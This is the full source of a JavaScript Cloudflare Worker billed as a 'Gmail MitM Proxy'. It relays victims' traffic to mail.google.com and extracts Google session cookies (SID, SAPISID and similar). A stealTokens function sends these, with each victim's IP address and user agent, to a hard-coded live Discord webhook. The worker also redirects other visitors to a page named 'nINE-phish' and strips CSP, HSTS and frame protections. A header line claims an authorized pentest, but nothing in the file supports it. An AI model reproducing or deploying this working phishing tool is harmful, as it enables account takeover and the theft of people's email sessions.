// Gmail MitM Proxy v2.2 - LIVE DISCORD WEBHOOK + PRODUCTION READY
// Deploy: Cloudflare Workers → Edit → Paste → Deploy
// AUTHORIZED PENTEST - Permission Confirmed

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';
const RATE_LIMIT = new Map();

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
  const userAgent = request.headers.get('User-Agent')?.substring(0, 200) || 'unknown';

  if (isRateLimited(clientIP)) {
    return new Response('Too Many Requests', { status: 429 });
  }

  const gmailPaths = [
    '/mail/', '/mail/u/', '/static/', '/chrome/', '/sync/', '/accounts/',
    '/serviceworker/', '/_/', '/s/i/', '/mail/client/', '/favicon.ico'
  ];

  if (gmailPaths.some(path => url.pathname.startsWith(path)) || url.pathname === '/') {
    if (url.pathname === '/') url.pathname = '/mail/u/0/#inbox';
    return await proxyGmail(url, request, clientIP, userAgent);
  }

  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
}

function isRateLimited(ip) {
  const now = Date.now();
  const key = `rate_${ip}`;
  let hits = RATE_LIMIT.get(key) || [];
  
  hits = hits.filter(hit => now - hit < 3600000);
  
  if (hits.length >= 100) return true;
  
  hits.push(now);
  RATE_LIMIT.set(key, hits);
  return false;
}

async function proxyGmail(url, request, clientIP, userAgent) {
  const headers = new Headers(request.headers);
  headers.set('Host', 'mail.google.com');
  headers.set('Origin', 'https://mail.google.com');
  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
  headers.set('Sec-Fetch-Site', 'same-origin');
  headers.set('Sec-Fetch-Mode', 'navigate');
  headers.set('Sec-Fetch-Dest', 'document');
  headers.set('Sec-Fetch-User', '?1');
  headers.set('Upgrade-Insecure-Requests', '1');
  headers.delete('Accept-Encoding');

  const gmailReq = new Request(`https://mail.google.com${url.pathname}${url.search}`, {
    method: request.method,
    headers,
    body: request.body,
    redirect: 'manual'
  });

  try {
    let response = await fetch(gmailReq);
    const tokens = extractTokens(response.headers);
    
    if (tokens.length > 0) {
      await stealTokens(tokens, clientIP, userAgent, url.href);
    }

    return craftResponse(response);
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 502 });
  }
}

function extractTokens(headers) {
  const cookies = headers.getSetCookie() || [];
  const regexes = [
    /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|GAPS|G_authuser)=([^;,\s]+)/gi,
    /gmail\.com=[^;,\s]+/gi,
    /__Host-user_auth_[^=]+=[^;,\s]+/gi
  ];

  const tokens = [];
  cookies.forEach(cookieStr => {
    regexes.forEach(regex => {
      let match;
      while ((match = regex.exec(cookieStr)) !== null) {
        tokens.push({ name: match[1], value: match[2] });
      }
    });
  });

  return [...new Set(tokens.map(t => `${t.name}:${t.value}`))].map(str => {
    const [name, value] = str.split(':');
    return { name, value };
  });
}

async function stealTokens(tokens, ip, ua, url) {
  const shortUA = ua.length > 100 ? ua.substring(0, 97) + '...' : ua;
  const preview = tokens.slice(0, 5).map(t => `\`${t.name}\`: ${t.value.slice(0, 20)}...`).join('\n');

  const payload = {
    username: '📧 Gmail Proxy',
    avatar_url: 'https://mail.google.com/mail/u/0/images/favicon5.ico',
    embeds: [{
      title: `🔒 ${tokens.length} Gmail Token(s) Captured`,
      description: `**IP:** \`${ip}\`\n**UA:** ${shortUA}\n**Path:** ${new URL(url).pathname}`,
      fields: [{ name: 'Tokens', value: preview || 'None readable', inline: false }],
      color: tokens.some(t => t.name.includes('SID')) ? 0x00ff00 : 0xffaa00,
      timestamp: new Date().toISOString()
    }]
  };

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(() => {});

  console.log(`PHISH HIT: ${ip} | ${tokens.length} tokens | ${tokens.map(t => t.name).join(',')}`);
}

function craftResponse(response) {
  const headers = new Headers(response.headers);

  headers.delete('Content-Security-Policy');
  headers.delete('Content-Security-Policy-Report-Only');
  headers.delete('X-Frame-Options');
  headers.delete('Strict-Transport-Security');
  headers.delete('X-Content-Type-Options');

  headers.set('Access-Control-Allow-Origin', '*');
  headers.set('Access-Control-Allow-Credentials', 'true');
  headers.set('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');

  const cookies = headers.getSetCookie() || [];
  headers.delete('Set-Cookie');
  
  cookies.forEach(cookie => {
    const relaxed = cookie
      .replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None; Secure')
      .replace(/Domain=[^;]+/gi, 'Domain=mail.google.com');
    headers.append('Set-Cookie', relaxed);
  });

  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers
  });
}
